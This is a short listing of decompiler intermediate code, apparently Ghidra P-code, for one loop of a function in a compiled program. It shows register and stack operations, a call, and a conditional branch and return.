(register, 0xc, 4) INT_AND (register, 0x8, 4) , (const, 0xffff, 4)
 ---  CALL (ram, 0x421ec8, 8) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0xc, 4) , (const, 0x4000, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x107, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x107, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x107, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x107, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x107, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x107, 4)
(register, 0x8, 4) INT_ADD (stack, 0xffffffffffffffc0, 4) , (const, 0x1, 4)
(register, 0x8, 4) INT_ZEXT (register, 0x13, 1)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (register, 0x8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe0, 4) MULTIEQUAL (stack, 0xffffffffffffffe0, 4) , (stack, 0xffffffffffffffe0, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffe8, 4) MULTIEQUAL (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffe8, 4)
(unique, 0x5080, 1) INT_SLESS (stack, 0xffffffffffffffc0, 4) , (unique, 0x10000115, 4)
(unique, 0x10000115, 4) CAST (register, 0x8, 4)
 ---  CBRANCH (ram, 0x40c3a8, 1) , (unique, 0x5080, 1)
 ---  RETURN (const, 0x0, 4)
